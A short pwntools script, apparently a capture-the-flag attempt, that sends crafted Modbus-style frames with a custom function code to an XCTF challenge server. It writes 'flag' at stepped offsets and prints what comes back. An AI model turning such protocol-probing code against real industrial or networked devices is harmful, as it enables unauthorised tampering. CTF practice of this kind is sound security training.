from pwn import *
import time

context.log_level = 'debug'  # 减少输出噪音

s = remote("pwn-1d83ffb5ed.challenge.xctf.org.cn", 9999, ssl=True)

#s.send(b'\x00\x01\x00\x00\x00\x06\xdf\x05\x00\x00\xff\x01')
#s.send(b'\x00\x01\x00\x00\x00\x09\xdf\x0f\x00\x00\x00\x20\x04\x66\x6c\x61\x67')
for i in range(0, 256, 32):
    da =  b"\x00\x01\x00\x00\x00\x09\xdf\x0f\x00" + bytes([i]) + b"\x00\x20\x04\x66\x6c\x61\x67"
    data = b"\x00\x01\x00\x00\x00\x06\xdf\x03\x00" + bytes([i]) + b"\x00\x60"
    
    try:
        s.send(da)
        s.settimeout(0.2)
        s.send(data)
        print(data)
        # 设置较短超时
        s.settimeout(0.3)
        try:
            response = s.recv(2048, timeout=0.3)
            if response:
                print(f"有响应: {response.hex()}")

        except:
            pass  # 无响应，继续下一个
        
        s.settimeout(None)
        
    except Exception as e:
        print(f"[-] 发送失败: {e}")
        break
    
    time.sleep(0.05)  # 更短的延迟

s.close()



# s.send(b'\x00\x01\x00\x00\x00\x06\xdf\x03\x00\xdf\x00\x40')

# resp = s.recvall(2048)
# s.close
# print(resp)

